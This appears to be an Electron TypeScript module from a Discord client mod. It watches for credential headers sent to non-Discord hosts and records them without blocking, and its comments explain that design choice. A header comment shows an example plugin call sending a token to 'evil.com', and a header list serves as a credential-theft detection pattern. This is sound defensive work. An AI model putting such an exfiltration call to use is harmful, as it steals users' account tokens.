import {measureSubmittedUpload} from "../statistics/network";
/**
 * Session-layer credential monitor (Phase 5) — **observe only**.
 *
 * ## Why it does not block
 *
 * This file's header used to present the layer as the control that blocks, and
 * the rule below used to cancel requests. Both were wrong, and the second was
 * wrong in a way only a real client could reveal.
 *
 * The moment the listener was moved to the stage where Electron actually
 * populates `requestHeaders` — see the note in `attachSession` — the rule became
 * live for the first time, and a real launch immediately produced:
 *
 *     credential sent to a non-Discord host  host=api.spotify.com    channel=authorization
 *     credential sent to a non-Discord host  host=dealer.spotify.com channel=cookie
 *
 * Those are **Discord's own Spotify rich-presence integration**, carrying the
 * user's Spotify OAuth credential. "A credential must not reach a host Discord
 * does not own" is a rule about *Discord's* token, and at the session layer there
 * is no marker saying who chose the header and no way to tell a user's Spotify
 * token from a stolen Discord one.
 *
 * So it records and lets the request through. Cancelling would break a feature
 * users can see, to defend against something this layer cannot distinguish.
 * The same principle as the renderer observer in incident 005, reached here by
 * measurement instead of by reading a header comment.
 *
 * This is still strictly better than the state it replaces: before the stage was
 * corrected, `requestHeaders` was always `undefined` and **nothing at all** was
 * seen. Now every credential-bound third-party request is visible, with its host
 * and the header's name.
 *
 * The control that *does* deny plugin network traffic is the broker
 * (`src/main/security/networkBroker.ts`), on its own session partition. The
 * Security Center labels the two separately for exactly this reason, and this
 * module's installed-state is reported as `egressMonitor`, not `egressGuard`.
 *
 * What it is: a detector with no reachability advantage over the renderer beyond
 * being in the session, seeing every request regardless of transport — fetch,
 * XHR, WebSocket, beacon, image, media, font, stylesheet, worker, ping,
 * navigation.
 *
 * The rule, and why it is *recorded*:
 *
 * > A request carrying authentication material to a host that is not Discord's
 * > is observed and recorded.
 *
 * Narrow on purpose. Blocking *all* non-Discord hosts at the session layer would
 * break Discord: third-party embeds, link previews, OAuth popouts, voice server
 * handshakes and CDN redirects all legitimately leave the origin. So the guard
 * does not maintain a list of everything Discord is allowed to talk to. It
 * looks for the one thing that actually constitutes exfiltration — a credential
 * on its way to a third party — and leaves credential-free traffic alone.
 *
 * Discord's own API calls carry `Authorization` to `discord.com`, so normal
 * operation is untouched. A plugin that tries
 * `fetch("https://evil.com", { headers: { Authorization: token }})` is *recorded*
 * here even if it also removed the renderer hook, because the session layer never
 * consulted the renderer — which is the property that makes the record
 * trustworthy, even though the request is not refused.
 *
 * Broker traffic is unaffected: it runs on a separate session partition, so it
 * never reaches this handler at all. That separation is the reason the broker
 * uses its own session.
 */
import { app, session, type Session } from "electron";
import { blockPrivacyRequest } from "./privacy";

import { DISCORD_ASSET_HOSTS } from "../../security/origins";
import { hostnameMatches } from "../../security/url";
import { onAppReady, tryInstall } from "./core";
import { installPermissionHandlers } from "./permissions";
import { consumeLimit } from "./rateLimit";
import { securityLog } from "./core";

/** Header names that carry credentials out of the client. */
const CREDENTIAL_HEADERS = [
  "authorization",
  "proxy-authorization",
  "cookie",
  "x-auth-token",
  "x-super-properties",
  "x-fingerprint",
] as const;

/**
 * Discord-owned domains. A request carrying a credential to one of these is
 * Discord talking to itself, so it is allowed.
 *
 * Asset hosts are included deliberately. Discord's own authenticated upload and
 * CDN flow sends credentials to `cdn.discordapp.com`, and blocking that would
 * break attachments. A credential reaching a Discord-operated bucket is also
 * not exfiltration: Discord already holds that credential, so the worst outcome
 * is a server-side log line, not a third party receiving the token.
 */
const DISCORD_DOMAINS = ["discord.com", "discordapp.com", "discordapp.net"] as const;

function isDiscordHost(hostname: string): boolean {
  for (const domain of DISCORD_DOMAINS) {
    if (hostnameMatches(hostname, domain)) return true;
  }
  for (const asset of DISCORD_ASSET_HOSTS) {
    if (hostnameMatches(hostname, asset)) return true;
  }
  return false;
}

export type EgressDecision = {
  allow: boolean;
  reason: string;
  host: string;
  credential: string;
};

/**
 * Pure decision function, exported so it can be unit tested without Electron.
 */
export function decideEgress(
  url: string,
  requestHeaders: Record<string, string | string[]> | undefined,
): EgressDecision {
  let host = "";
  try {
    host = new URL(url).hostname.toLowerCase();
  } catch {
    return { allow: true, reason: "unparseable url — not our call", host: "", credential: "" };
  }

  if (host.length === 0) {
    // data:, blob:, about:, chrome-extension:, devtools:// — no host to judge.
    return { allow: true, reason: "no host", host: "", credential: "" };
  }
  if (isDiscordHost(host)) {
    return { allow: true, reason: "discord-owned host", host, credential: "" };
  }

  if (requestHeaders === undefined) return { allow: true, reason: "no request headers", host, credential: "" };

  // Chromium lower-cases request header names in webRequest, but be defensive:
  // a header list arriving through a different path may not be normalized.
  for (const [rawName, rawValue] of Object.entries(requestHeaders)) {
    const name = rawName.toLowerCase();
    if (!(CREDENTIAL_HEADERS as readonly string[]).includes(name)) continue;
    const value = Array.isArray(rawValue) ? rawValue.join(";") : rawValue;
    if (typeof value !== "string" || value.length === 0) continue;
    // An empty or placeholder value carries nothing, so it is not exfiltration.
    if (value === "null" || value === "undefined" || value === "[]") continue;
    return {
      allow: false,
      reason: "credential sent to a non-Discord host",
      host,
      // Only the header *name* is ever recorded. The value never reaches a log,
      // an event, or the Security Center.
      credential: name,
    };
  }

  return { allow: true, reason: "no credential on a third-party request", host, credential: "" };
}

const installedSessions = new Set<Session>();

/**
 * Buckets whose rate-limit notice has already been written for this cooldown.
 *
 * Small, local, cleared when the bucket refills. Same shape as the renderer's
 * report-channel suppression — one mechanism, used in both places, rather than two
 * ad-hoc counters.
 */
const MAX_EGRESS_SUPPRESSIONS = 512;
const egressSuppressed = new Map<string, number>();

export function egressSuppressionCount(): number {
  return egressSuppressed.size;
}

function shouldReportSuppression(key: string, retryAfterMs: number): boolean {
  const now = Date.now();

  // Opportunistic TTL cleanup keeps the monitor bounded without a background
  // timer. Entries expire with the limiter cooldown they represent.
  for (const [existing, expiresAt] of egressSuppressed) {
    if (expiresAt <= now) egressSuppressed.delete(existing);
  }

  const current = egressSuppressed.get(key);
  if (current !== undefined && current > now) return false;

  // At capacity, fail quiet rather than allocating another attacker-controlled
  // hostname. The request still passes through; only duplicate reporting is
  // suppressed.
  if (egressSuppressed.size >= MAX_EGRESS_SUPPRESSIONS) return false;

  egressSuppressed.set(key, now + Math.max(1, retryAfterMs));
  return true;
}

/**
 * Install the guard on Discord's default session.
 *
 * **Must not be called before `app.whenReady()`.** `session.defaultSession`
 * throws `Session can only be received when app is ready` otherwise, and that
 * throw used to take the whole client down. `installSessionGuards()` below is
 * the safe entry point; this function is the raw primitive and is only called
 * from there.
 */
export function installEgressGuard(): void {
  attachSession(session.defaultSession);
}

/**
 * The safe entry point: install every session-level guard, once the app is
 * ready, and never let a failure escape.
 *
 * Idempotent by design — it may be called from `whenReady()` and again on the
 * first `web-contents-created`, whichever ordering the current Discord build
 * uses to create its main window.
 */
export function installSessionGuards(): void {
  onAppReady(() => {
    tryInstall("egress-guard", installEgressGuard);
    tryInstall("permission-handlers", installPermissionHandlers);
  });
}

/** Re-attach on every new webContents as a belt-and-braces ordering fix. */
export function watchForNewContents(): void {
  const { app } = require("electron") as typeof import("electron");
  onAppReady(() => {
    app.on("web-contents-created", () => {
      tryInstall("egress-guard", installEgressGuard);
      tryInstall("permission-handlers", installPermissionHandlers);
    });
  });
}

/** Exported for tests and for any future non-default session. */
export function attachSession(target: Session): void {
  if (installedSessions.has(target)) return;
  // Stop telemetry before cache lookup too: onBeforeSendHeaders alone misses
  // a cached Sentry script, which could still install listeners and timers.
  // This is the sole onBeforeRequest listener on Discord's session. The later
  // check below also covers redirects and builds that replace this early slot.
  target.webRequest.onBeforeRequest((details, callback) => {
    const cancel=blockPrivacyRequest(details.url);
    if(!cancel)try{measureSubmittedUpload(details.webContentsId,details.uploadData);}catch{/* Diagnostics must never affect requests. */}
    callback({ cancel });
  });

  // `extraInfoSpec: ["requestHeaders"]` is required, and the listener has to be
  // `onBeforeSendHeaders` — not `onBeforeRequest`.
  //
  // `onBeforeRequest` fires *before* the request headers exist. Measured against
  // the real Electron binary rather than taken from a doc:
  //
  //   onBeforeRequest     -> hasRequestHeaders: false, keys: []
  //   onBeforeSendHeaders -> hasRequestHeaders: true,
  //                           keys: [x-probe, Sec-Fetch-Site, ...]
  //
  // So the guard was installed, the filter looked right, and
  // `details.requestHeaders` was always `undefined`: every request looked
  // credential-free and the layer was a silent no-op. Fixing the stage is what
  // made the rule observable for the first time.
  //
  // ── And observing it is what showed the rule is unsafe to enforce ──────────
  //
  // With the stage corrected, a real launch immediately produced:
  //
  //   credential sent to a non-Discord host  host=api.spotify.com    channel=authorization
  //   credential sent to a non-Discord host  host=dealer.spotify.com channel=cookie
  //
  // Those are **Discord's own Spotify rich-presence integration**, carrying the
  // user's Spotify OAuth credential. "A credential must not go to a host Discord
  // does not own" is a rule about *Discord's* token, but at the session layer
  // there is no way to tell the user's Spotify token from a stolen Discord one,
  // and the request carries no marker saying who chose it.
  //
  // Cancelling therefore breaks a feature users can see, to defend against
  // something the session layer cannot actually distinguish. So the decision is
  // deliberately **recorded, not enforced** — the same principle as the renderer
  // observer in incident 005, reached here by measurement instead of by reading
  // the header comment.
  //
  // This is still strictly better than the state it replaces: before, nothing was
  // seen at all. Now every credential-bound third-party request is visible in
  // the Security Center with its host and header name.
  //
  // The cast is because `WebRequestFilter` in electron.d.ts omits
  // `extraInfoSpec`; the option is documented and honoured at runtime.
  const filter = {
    urls: ["*://*/*", "ws://*/*", "wss://*/*"],
    extraInfoSpec: ["requestHeaders"],
  } as unknown as Electron.WebRequestFilter;

  target.webRequest.onBeforeSendHeaders(
    filter,
    (details, callback) => {
      // Privacy is enforced here, independently of credential observation. Use
      // the existing listener: Electron only honors the last one per stage.
      if (blockPrivacyRequest(details.url)) {
        callback({ cancel: true });
        return;
      }
      let headers: Record<string, string | string[]> | undefined;
      try {
        headers = (details as { requestHeaders?: Record<string, string | string[]> }).requestHeaders;
      } catch {
        headers = undefined;
      }

      // A missing header set means we cannot judge. It is surfaced as a critical
      // event so the degradation is visible rather than silent, and it never
      // becomes a refusal — blocking on an unreadable field would take the whole
      // client offline on any Electron version that stops populating it.
      if (headers === undefined) {
        securityLog().record({
          type: "EGRESS_OBSERVED",
          reason: "egress guard could not read request headers — detection degraded",
          host: safeHostname(details.url),
          origin: "session",
        });
        callback({ requestHeaders: headers });
        return;
      }

      const decision = decideEgress(details.url, headers);
      if (!decision.allow) {
        // Recorded, not cancelled — see the header. And the recording is
        // *suppressed*, because the limiter used to be consulted and then ignored
        // for the write: every request past the budget still reached
        // `securityLog().record`, and each of those is an event plus an append to
        // the audit file. A page reporting on a timer could write thousands of
        // identical lines — the exact I/O the rate limit exists to prevent.
        //
        // One notice per cooldown, then silence. The suppression set is keyed on
        // the same bucket, so it lasts exactly as long as the cooldown.
        const key = `egress:${decision.host}`;
        const limit = consumeLimit(key, "network");
        if (limit.allowed) {
          egressSuppressed.delete(key);
          securityLog().record({
            type: "EGRESS_OBSERVED",
            reason: decision.reason,
            host: decision.host,
            method: details.method,
            origin: "session",
            // Only the header *name* is recorded. The value never reaches a log,
            // an event, or the Security Center.
            channel: decision.credential,
          });
        } else if (shouldReportSuppression(key, limit.retryAfterMs)) {
          securityLog().record({
            type: "RATE_LIMIT_TRIGGERED",
            reason: `credential egress for ${decision.host} is being reported at a high rate — ` +
              `further observations suppressed for this cooldown`,
            host: decision.host,
            origin: "session",
            count: limit.retryAfterMs,
          });
        }
      }

      // Always hand the headers straight back. In `onBeforeSendHeaders` the
      // request only continues if the callback receives them, so this argument is
      // not a formality — it is the only way to let the request through.
      callback({ requestHeaders: headers });
    },
  );
  installedSessions.add(target);
}

/** Hostname for a log line, without ever letting a parse failure escape. */
function safeHostname(url: string): string {
  try {
    return new URL(url).hostname;
  } catch {
    return "";
  }
}

/** Diagnostic for the Security Center. Safe before the app is ready. */
export function egressGuardActive(): boolean {
  // `session.defaultSession` throws before `ready`, and this is called from a
  // status path that must never be the thing that breaks startup.
  if (!app.isReady()) return installedSessions.size > 0;
  try {
    return installedSessions.has(session.defaultSession);
  } catch {
    return false;
  }
}
